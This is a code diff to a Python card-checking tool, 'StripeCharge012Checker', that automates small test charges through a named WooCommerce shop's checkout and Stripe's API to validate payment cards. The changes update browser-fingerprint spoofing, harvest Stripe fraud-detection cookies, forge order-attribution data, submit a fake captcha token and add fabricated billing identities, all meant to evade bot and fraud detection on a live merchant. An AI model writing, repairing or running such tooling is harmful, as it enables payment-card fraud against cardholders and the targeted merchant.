@@ -342,11 +342,11 @@ class StripeCharge012Checker:
     def __init__(self, user_id=None):
         # Modern browser user agents
         self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
         ]
         self.user_agent = random.choice(self.user_agents)
         self.bin_cache = {}
@@ -354,7 +354,7 @@ class StripeCharge012Checker:
         self.base_url = "https://bellobrick.com"
         
         # Stripe keys from network data
-        self.stripe_key = "pk_live_51Gv2pCHrGjSxgNAlDs0vH0Ut44paVZSsXDRbFylxLFL8jdNT4hcNAYTYDuDBrblSfFOMzthHqxsZboNVSEoIFFNy003eJMesxa"
+        self.stripe_key = "pk_live_51Gv2pCHrGjSxgNAlqoWvKSAM9DJR7rKQrsSoSJ6GrKlluJh9KjrHlmo2hunYynZbNVFyC5d7gG7j8pwO01GP1CfQ00OVdJStbN"
         self.stripe_account = "acct_1Gv2pCHrGjSxgNAl"
         
         # Product info from network data
@@ -371,6 +371,17 @@ class StripeCharge012Checker:
                 "city": "Outer",
                 "postcode": "9406",
                 "phone": "491671782",
+                "state": "",
+                "country": "BE",
+                "email": "caseylang222@gmail.com"
+            },
+            {
+                "first_name": "mumiru",
+                "last_name": "goii",
+                "address": "Langestraat 31",
+                "city": "Jollain-merlin",
+                "postcode": "7620",
+                "phone": "0496435591",
                 "state": "",
                 "country": "BE",
                 "email": "caseylang222@gmail.com"
@@ -419,10 +430,15 @@ class StripeCharge012Checker:
         self.proxy_used = False
         self.proxy_response_time = 0.0
         
-        # Session storage
+        # Session storage - FIX: Initialize cookies dict properly
         self.cookies = {}
+        self.cookie_jar = {}  # Store cookies from all responses
         self.checkout_nonce = None
         self.update_order_review_nonce = None
+        
+        # FIX: Track stripe session IDs from cookies (from network data)
+        self.stripe_mid = None
+        self.stripe_sid = None
         
         # httpx client
         self.client = None
@@ -439,7 +455,7 @@ class StripeCharge012Checker:
             "Europe/Brussels", "Europe/Paris", "Europe/Berlin", "Europe/Amsterdam"
         ]
         self.languages = [
-            "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.9,nl;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
+            "en-US,en;q=0.9", "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.9,nl;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
         ]
 
         self.platform = "Win32"
@@ -448,9 +464,9 @@ class StripeCharge012Checker:
         chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
         if chrome_version:
             version = chrome_version.group(1)
-            self.sec_ch_ua = f'"Not:A-Brand";v="99", "Google Chrome";v="{version}", "Chromium";v="{version}"'
+            self.sec_ch_ua = f'"Google Chrome";v="{version}", "Not.A/Brand";v="8", "Chromium";v="{version}"'
         else:
-            self.sec_ch_ua = '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"'
+            self.sec_ch_ua = '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"'
 
         self.sec_ch_ua_mobile = "?0"
         self.screen_resolution = random.choice(self.screen_resolutions)
@@ -473,14 +489,13 @@ class StripeCharge012Checker:
         return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')
 
     def get_base_headers(self):
-        """Get base headers mimicking browser"""
+        """Get base headers mimicking browser - FIX: Updated to match network data"""
         return {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Accept-Encoding': 'gzip, deflate, br, zstd',
             'Accept-Language': self.accept_language,
             'Cache-Control': 'max-age=0',
             'Connection': 'keep-alive',
-            'DNT': '1',
             'Sec-CH-UA': self.sec_ch_ua,
             'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
             'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
@@ -491,6 +506,42 @@ class StripeCharge012Checker:
             'Upgrade-Insecure-Requests': '1',
             'User-Agent': self.user_agent,
         }
+
+    # FIX: New helper method to build cookie string from stored cookies
+    def _build_cookie_header(self):
+        """Build cookie header string from stored cookie jar"""
+        if not self.cookie_jar:
+            return ""
+        return "; ".join([f"{k}={v}" for k, v in self.cookie_jar.items()])
+
+    # FIX: New helper method to update cookie jar from response
+    def _update_cookies_from_response(self, response):
+        """Extract and store cookies from response headers"""
+        if response.headers:
+            set_cookie_headers = response.headers.get_all('set-cookie') if hasattr(response.headers, 'get_all') else []
+            if not set_cookie_headers:
+                # Fallback for httpx
+                set_cookie_headers = [v for k, v in response.headers.items() if k.lower() == 'set-cookie']
+            
+            for cookie_str in set_cookie_headers:
+                # Parse cookie name=value
+                cookie_parts = cookie_str.split(';')[0].strip()
+                if '=' in cookie_parts:
+                    name, value = cookie_parts.split('=', 1)
+                    self.cookie_jar[name] = value
+                    
+                    # FIX: Track Stripe cookies
+                    if name == '__stripe_mid':
+                        self.stripe_mid = value
+                        logger.cookie(f"Got stripe_mid: {value[:20]}...")
+                    elif name == '__stripe_sid':
+                        self.stripe_sid = value
+                        logger.cookie(f"Got stripe_sid: {value[:20]}...")
+        
+        # Also check cookies from httpx response.cookies
+        if hasattr(response, 'cookies') and response.cookies:
+            for name, value in response.cookies.items():
+                self.cookie_jar[name] = value
 
     async def get_bin_info(self, cc):
         """Get BIN information with safe None handling"""
@@ -752,7 +803,7 @@ class StripeCharge012Checker:
         await asyncio.sleep(delay)
 
     async def make_request_with_retry(self, method, url, max_retries=3, **kwargs):
-        """Make request with retry logic for VPS compatibility"""
+        """Make request with retry logic for VPS compatibility - FIX: Proper cookie handling"""
         last_exception = None
         
         for attempt in range(max_retries):
@@ -769,6 +820,22 @@ class StripeCharge012Checker:
                     if key not in headers:
                         headers[key] = value
                 
+                # FIX: Set appropriate Sec-Fetch-Site based on URL
+                if self.base_url in url:
+                    if 'Referer' in headers:
+                        headers['Sec-Fetch-Site'] = 'same-origin'
+                    else:
+                        headers['Sec-Fetch-Site'] = 'none'
+                elif 'stripe.com' in url:
+                    headers['Sec-Fetch-Site'] = 'cross-site'
+                    headers['Sec-Fetch-Dest'] = 'empty'
+                    headers['Sec-Fetch-Mode'] = 'cors'
+                
+                # FIX: Add cookie header from cookie jar
+                cookie_str = self._build_cookie_header()
+                if cookie_str:
+                    headers['Cookie'] = cookie_str
+                
                 # Update dynamic headers
                 headers['User-Agent'] = self.user_agent
                 headers['Accept-Language'] = self.accept_language
@@ -777,10 +844,8 @@ class StripeCharge012Checker:
 
                 response = await self.client.request(method, url, **kwargs)
                 
-                # Store cookies from response
-                if response.cookies:
-                    for name, value in response.cookies.items():
-                        self.cookies[name] = value
+                # FIX: Update cookie jar from response
+                self._update_cookies_from_response(response)
                 
                 return response
                 
@@ -802,14 +867,16 @@ class StripeCharge012Checker:
         raise last_exception if last_exception else Exception("All retry attempts failed")
 
     async def initialize_session(self):
-        """Initialize session with proper cookies and proxy"""
+        """Initialize session with proper cookies and proxy - FIX: Accept 200, 202, 302"""
         try:
             logger.step(1, 6, "Initializing session...")
 
             response = await self.make_request_with_retry('GET', f"{self.base_url}/")
 
-            if response.status_code == 200:
-                logger.success("Session initialized successfully")
+            # FIX: Accept 200, 202, and 302 as valid responses
+            if response.status_code in [200, 202, 302]:
+                logger.success(f"Session initialized successfully (status: {response.status_code})")
+                logger.network(f"Cookies collected: {len(self.cookie_jar)}")
                 return True
             else:
                 logger.error(f"Failed with status {response.status_code}")
@@ -827,6 +894,7 @@ class StripeCharge012Checker:
             # Load product page first
             response = await self.make_request_with_retry('GET', self.product_url)
 
+            # FIX: Accept 200, 202 as valid
             if response.status_code not in [200, 202]:
                 return False, f"Failed to load product page: {response.status_code}"
 
@@ -862,10 +930,15 @@ class StripeCharge012Checker:
                 "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary{boundary}",
                 "Origin": self.base_url,
                 "Referer": self.product_url,
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-User": "?1",
             }
 
             response = await self.make_request_with_retry('POST', self.product_url, headers=add_headers, content=cart_data.encode())
 
+            # FIX: Accept 200, 202, 302 as valid
             if response.status_code in [200, 202, 302]:
                 logger.success("Product added to cart successfully")
                 return True, None
@@ -877,13 +950,23 @@ class StripeCharge012Checker:
             return False, f"Add to cart error: {str(e)}"
 
     async def get_checkout_page(self):
-        """Load checkout page and extract nonces"""
+        """Load checkout page and extract nonces - FIX: Add proper referer chain, accept 200/202"""
         try:
             logger.step(3, 6, "Loading checkout page...")
 
-            response = await self.make_request_with_retry('GET', f"{self.base_url}/checkout/")
+            checkout_headers = {
+                "Referer": f"{self.base_url}/cart/",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-User": "?1",
+                "Upgrade-Insecure-Requests": "1",
+            }
 
-            if response.status_code != 200:
+            response = await self.make_request_with_retry('GET', f"{self.base_url}/checkout/", headers=checkout_headers)
+
+            # FIX: Accept 200 AND 202
+            if response.status_code not in [200, 202]:
                 return False, f"Failed to load checkout page: {response.status_code}"
 
             html_content = response.text
@@ -925,7 +1008,6 @@ class StripeCharge012Checker:
                     return False, f"Failed to get checkout page: {error}"
                 
                 if not self.update_order_review_nonce:
-                    # If still missing, try one more time with a fresh request
                     await asyncio.sleep(1)
                     success, error = await self.get_checkout_page()
                     if not success or not self.update_order_review_nonce:
@@ -935,8 +1017,8 @@ class StripeCharge012Checker:
             current_time = datetime.now()
             session_start = current_time.strftime('%Y-%m-%d %H:%M:%S')
             
-            # URL encode the user agent
-            user_agent_encoded = self.user_agent.replace(' ', '%20')
+            # URL encode the user agent - FIX: match network data format exactly
+            user_agent_encoded = self.user_agent.replace(' ', '%20').replace('(', '%28').replace(')', '%29').replace(';', '%3B')
             
             post_data = {
                 'wc-ajax': 'update_order_review',
@@ -956,11 +1038,11 @@ class StripeCharge012Checker:
                 's_address_2': '',
                 'has_full_address': 'true',
                 'post_data': (
-                    f"wc_order_attribution_source_type=organic&"
-                    f"wc_order_attribution_referrer=https%3A%2F%2Fwww.google.com%2F&"
+                    f"wc_order_attribution_source_type=typein&"
+                    f"wc_order_attribution_referrer=(none)&"
                     f"wc_order_attribution_utm_campaign=(none)&"
-                    f"wc_order_attribution_utm_source=google&"
-                    f"wc_order_attribution_utm_medium=organic&"
+                    f"wc_order_attribution_utm_source=(direct)&"
+                    f"wc_order_attribution_utm_medium=(none)&"
                     f"wc_order_attribution_utm_content=(none)&"
                     f"wc_order_attribution_utm_id=(none)&"
                     f"wc_order_attribution_utm_term=(none)&"
@@ -969,7 +1051,7 @@ class StripeCharge012Checker:
                     f"wc_order_attribution_utm_marketing_tactic=(none)&"
                     f"wc_order_attribution_session_entry=https%3A%2F%2Fbellobrick.com%2F&"
                     f"wc_order_attribution_session_start_time={session_start.replace(' ', '%20')}&"
-                    f"wc_order_attribution_session_pages=13&"
+                    f"wc_order_attribution_session_pages=6&"
                     f"wc_order_attribution_session_count=1&"
                     f"wc_order_attribution_user_agent={user_agent_encoded}&"
                     f"billing_first_name={user_info['first_name']}&"
@@ -979,7 +1061,7 @@ class StripeCharge012Checker:
                     f"billing_address_1={user_info['address'].replace(' ', '%20')}&"
                     f"billing_address_2=&"
                     f"billing_postcode={user_info['postcode']}&"
-                    f"billing_city={user_info['city']}&"
+                    f"billing_city={user_info['city'].replace(' ', '%20')}&"
                     f"billing_state={user_info['state']}&"
                     f"billing_phone={user_info['phone'].replace(' ', '%20')}&"
                     f"billing_email={user_info['email'].replace('@', '%40')}&"
@@ -996,11 +1078,7 @@ class StripeCharge012Checker:
                     f"shipping_method%5B0%5D=local_pickup%3A11&"
                     f"payment_method=eh_stripe_pay&"
                     f"woocommerce-process-checkout-nonce={self.checkout_nonce or ''}&"
-                    f"_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&"
-                    f"eh_stripe_pay_token=&"
-                    f"eh_stripe_pay_currency=eur&"
-                    f"eh_stripe_pay_amount=12&"
-                    f"eh_stripe_card_type=visa"
+                    f"_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
                 ),
                 'shipping_method[0]': 'local_pickup:11'
             }
@@ -1011,6 +1089,9 @@ class StripeCharge012Checker:
                 "X-Requested-With": "XMLHttpRequest",
                 "Origin": self.base_url,
                 "Referer": f"{self.base_url}/checkout/",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "same-origin",
             }
 
             logger.network(f"Sending update_order_review with security nonce: {self.update_order_review_nonce}")
@@ -1028,15 +1109,12 @@ class StripeCharge012Checker:
                     logger.success("Order review updated (non-JSON response)")
                     return True, None
             elif response.status_code == 403:
-                # 403 error - might be Cloudflare or security block
                 logger.error(f"403 Forbidden - Possible Cloudflare block or missing nonce")
-                # Try once more with fresh checkout page
                 logger.warning("Retrying with fresh checkout page...")
                 await asyncio.sleep(2)
                 
                 success, error = await self.get_checkout_page()
                 if success and self.update_order_review_nonce:
-                    # Retry the request with new nonce
                     post_data['security'] = self.update_order_review_nonce
                     post_data['post_data'] = post_data['post_data'].replace(
                         f"woocommerce-process-checkout-nonce={self.checkout_nonce or ''}",
@@ -1057,7 +1135,7 @@ class StripeCharge012Checker:
             return False, f"Update order review error: {str(e)}"
 
     async def create_stripe_payment_method(self, card_details, user_info):
-        """Create Stripe payment method"""
+        """Create Stripe payment method - FIX: Use strip cookies, wallet_config_id"""
         try:
             cc, mes, ano, cvv = card_details
 
@@ -1066,9 +1144,15 @@ class StripeCharge012Checker:
             # Generate GUIDs (from network data format)
             guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
             
-            # Get stripe mid/sid from cookies or generate
-            muid = self.cookies.get('__stripe_mid', f"{random.randint(10000000, 99999999)}-cf6b-49f4-a75e-{random.randint(100000000000, 999999999999)}")
-            sid = self.cookies.get('__stripe_sid', f"{random.randint(10000000, 99999999)}-a555-48c5-a5f6-{random.randint(100000000000, 999999999999)}")
+            # FIX: Use stripe_mid and stripe_sid from cookies, or generate fallbacks
+            muid = self.stripe_mid or f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
+            sid = self.stripe_sid or f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
+            
+            # FIX: Generate wallet_config_id as in network data
+            wallet_config_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
+            
+            # FIX: Generate client_session_id
+            client_session_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
 
             payment_data = {
                 'type': 'card',
@@ -1084,13 +1168,14 @@ class StripeCharge012Checker:
                 'muid': muid,
                 'sid': sid,
                 'pasted_fields': 'number',
-                'payment_user_agent': 'stripe.js/157d4ab676; stripe-js-v3/157d4ab676; split-card-element',
+                'payment_user_agent': 'stripe.js/332636417d; stripe-js-v3/332636417d; split-card-element',
                 'referrer': self.base_url,
-                'time_on_page': str(random.randint(150000, 200000)),
-                'client_attribution_metadata[client_session_id]': f"{random.randint(10000000, 99999999)}-102a-4f9a-9ab6-2833b7fb66f4",
+                'time_on_page': str(random.randint(80000, 120000)),
+                'client_attribution_metadata[client_session_id]': client_session_id,
                 'client_attribution_metadata[merchant_integration_source]': 'elements',
                 'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
                 'client_attribution_metadata[merchant_integration_version]': '2017',
+                'client_attribution_metadata[wallet_config_id]': wallet_config_id,
                 'key': self.stripe_key,
                 '_stripe_version': '2022-08-01',
                 'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.test_token'
@@ -1102,6 +1187,9 @@ class StripeCharge012Checker:
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Origin": "https://js.stripe.com",
                 "Referer": "https://js.stripe.com/",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "cross-site",
             }
 
             # Use separate client for Stripe (no proxy needed for Stripe API)
@@ -1137,14 +1225,14 @@ class StripeCharge012Checker:
         try:
             logger.step(6, 6, "Processing checkout...")
 
-            # Build checkout data (from network data format)
+            # Build checkout data (from network data format) - FIX: match network data exactly
             checkout_data = {
                 'wc-ajax': 'checkout',
-                'wc_order_attribution_source_type': 'organic',
-                'wc_order_attribution_referrer': 'https://www.google.com/',
+                'wc_order_attribution_source_type': 'typein',
+                'wc_order_attribution_referrer': '(none)',
                 'wc_order_attribution_utm_campaign': '(none)',
-                'wc_order_attribution_utm_source': 'google',
-                'wc_order_attribution_utm_medium': 'organic',
+                'wc_order_attribution_utm_source': '(direct)',
+                'wc_order_attribution_utm_medium': '(none)',
                 'wc_order_attribution_utm_content': '(none)',
                 'wc_order_attribution_utm_id': '(none)',
                 'wc_order_attribution_utm_term': '(none)',
@@ -1153,7 +1241,7 @@ class StripeCharge012Checker:
                 'wc_order_attribution_utm_marketing_tactic': '(none)',
                 'wc_order_attribution_session_entry': f'{self.base_url}/',
                 'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                'wc_order_attribution_session_pages': '13',
+                'wc_order_attribution_session_pages': '6',
                 'wc_order_attribution_session_count': '1',
                 'wc_order_attribution_user_agent': self.user_agent,
                 'billing_first_name': user_info['first_name'],
@@ -1181,9 +1269,9 @@ class StripeCharge012Checker:
                 'payment_method': 'eh_stripe_pay',
                 'woocommerce-process-checkout-nonce': self.checkout_nonce or '',
                 '_wp_http_referer': '/?wc-ajax=update_order_review',
-                'eh_stripe_pay_amount': '12',  # €0.12 in cents
                 'eh_stripe_pay_token': payment_method_id,
                 'eh_stripe_pay_currency': 'eur',
+                'eh_stripe_pay_amount': '12',
                 'eh_stripe_card_type': 'visa'
             }
 
@@ -1193,6 +1281,9 @@ class StripeCharge012Checker:
                 "X-Requested-With": "XMLHttpRequest",
                 "Origin": self.base_url,
                 "Referer": f"{self.base_url}/checkout/",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "same-origin",
             }
 
             response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=checkout", headers=checkout_headers, data=checkout_data)
@@ -1416,9 +1507,12 @@ class StripeCharge012Checker:
             # Get Belgium address
             address_info = random.choice(self.belgium_addresses)
             
-            # Generate random email if needed
-            random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-            email = f"{random_string}@gmail.com"
+            # Generate random email if address doesn't have one or use the one from address
+            if address_info.get('email'):
+                email = address_info['email']
+            else:
+                random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+                email = f"{random_string}@gmail.com"
 
             user_info = {
                 'first_name': address_info['first_name'],
